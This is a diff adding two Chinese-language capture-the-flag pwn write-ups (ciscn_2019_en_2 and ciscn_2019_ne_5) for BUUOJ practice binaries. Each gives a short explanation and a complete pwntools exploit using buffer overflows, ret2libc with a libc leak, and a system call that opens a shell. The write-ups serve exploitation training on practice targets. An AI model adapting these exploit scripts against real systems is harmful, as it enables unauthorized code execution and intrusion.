@@ -593,3 +593,84 @@ p.sendline(payload)
 p.interactive()
 ```
 
+## 19 ciscn_2019_en_2
+
+`ret2libc`,没啥好说的，跟之前有一题很像
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',29048)
+def dbg():
+    gdb.attach(p)
+    pause()
+
+pop_rdi = 0x0000000000400c83
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+ret = 0x4006b9
+main = elf.sym['main']
+
+p.recvuntil(b'choice!\n')
+p.sendline(b'1')
+p.recvuntil(b'encrypted\n')
+payload = b'\x00'+b'a'*0x57+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
+p.sendline(payload)
+
+puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+libc = LibcSearcher('puts',puts_addr)
+libc_base = puts_addr-libc.dump('puts')
+log.info("libc_base:"+hex(libc_base))
+
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+p.recvuntil(b'choice!\n')
+p.sendline(b'1')
+p.recvuntil(b'encrypted\n')
+payload = b'\x00'+b'a'*0x57+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys)
+p.sendline(payload)
+p.interactive()
+```
+
+## 20 ciscn_2019_ne_5
+
+这个题目挺有意思的
+
+ida里看到4那个选项对应的就是`GetFlag()`,里面说我们输入的log就是flag，那么我们应该先选一输入`system(/bin/sh)`,但是没找到`/bin/sh`，
+
+#### `system(sh)`也是可以的
+
+这份exp是直接截断了fflush，也可以用`ROPgadget --binary pwn --string "sh"`来查查，确实有一个(似乎就是这一个)
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+def dbg():
+    gdb.attach(p)
+    pause()
+
+binsh = 0x80482E6+4	#0x80482E6是字符串fflush，这里对它做了一个截断，留下了sh
+sys_addr = 0x80484D0
+p.sendlineafter(b'password:',b'administrator')
+p.recvuntil(b':')
+p.sendline(b'1')
+payload = b'a'*0x48+b'b'*0x4+p32(sys_addr)+b'a'*4+p32(binsh)
+p.recvuntil(b'info:')
+p.sendline(payload)
+p.recvuntil(b':')
+p.sendline(b'4')
+p.interactive()
+```
+
